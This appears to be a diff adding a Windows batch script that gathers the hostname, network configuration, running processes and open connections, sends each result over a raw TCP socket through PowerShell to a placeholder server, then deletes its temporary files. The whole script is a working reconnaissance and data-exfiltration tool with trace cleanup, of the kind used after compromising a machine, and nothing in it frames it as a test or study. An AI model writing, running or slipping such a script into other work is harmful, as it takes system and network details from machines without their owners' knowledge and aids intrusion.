@@ -1,0 +1,30 @@
+@echo off
+
+REM Run the hostname command and save the output to a temporary file
+hostname > "%TEMP%\hostname_output.txt"
+
+REM Run the ipconfig command and save the output to a temporary file
+ipconfig > "%TEMP%\ipconfig_output.txt"
+
+REM Run the tasklist command and save the output to a temporary file
+tasklist > "%TEMP%\tasklist_output.txt"
+
+REM Run the netstat command and save the output to a temporary file
+netstat > "%TEMP%\netstat_output.txt"
+
+REM Send each file's contents to the Python server using PowerShell
+powershell -Command "$fileContent = Get-Content -Raw -Path '%TEMP%\hostname_output.txt'; $client = New-Object System.Net.Sockets.TcpClient('<your_server_ip>', <your_server_port>); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine($fileContent); $writer.Flush(); $client.Close()"
+
+powershell -Command "$fileContent = Get-Content -Raw -Path '%TEMP%\ipconfig_output.txt'; $client = New-Object System.Net.Sockets.TcpClient('<your_server_ip>', <your_server_port>); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine($fileContent); $writer.Flush(); $client.Close()"
+
+powershell -Command "$fileContent = Get-Content -Raw -Path '%TEMP%\tasklist_output.txt'; $client = New-Object System.Net.Sockets.TcpClient('<your_server_ip>', <your_server_port>); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine($fileContent); $writer.Flush(); $client.Close()"
+
+powershell -Command "$fileContent = Get-Content -Raw -Path '%TEMP%\netstat_output.txt'; $client = New-Object System.Net.Sockets.TcpClient('<your_server_ip>', <your_server_port>); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine($fileContent); $writer.Flush(); $client.Close()"
+
+REM Clean up the temporary files
+del "%TEMP%\hostname_output.txt"
+del "%TEMP%\ipconfig_output.txt"
+del "%TEMP%\tasklist_output.txt"
+del "%TEMP%\netstat_output.txt"
+
+exit
